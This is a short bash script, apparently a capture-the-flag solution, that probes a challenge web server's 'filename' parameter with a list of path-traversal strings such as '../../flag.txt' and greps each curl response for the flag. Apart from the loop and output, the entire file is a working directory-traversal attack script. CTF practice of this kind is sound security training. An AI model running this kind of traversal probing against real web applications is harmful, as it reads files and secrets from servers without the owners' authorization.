#!/bin/bash
BASE="https://0079b55c2caf8a45a047575567d82344-liber8dogs.web.cityinthe.cloud/dog?filename="

for p in \
  "../../flag.txt" \
  "../../../flag.txt" \
  "../../../../flag.txt" \
  "../../dogs/flag.txt" \
  "../../uploads/flag.txt" \
  "../../images/flag.txt" \
  "../../../app/flag.txt" \
  "../../../static/flag.txt"
do
  echo "[+] Trying: $p"
  curl -s "${BASE}${p}" | grep -E "Liber8|flag|\{"
done
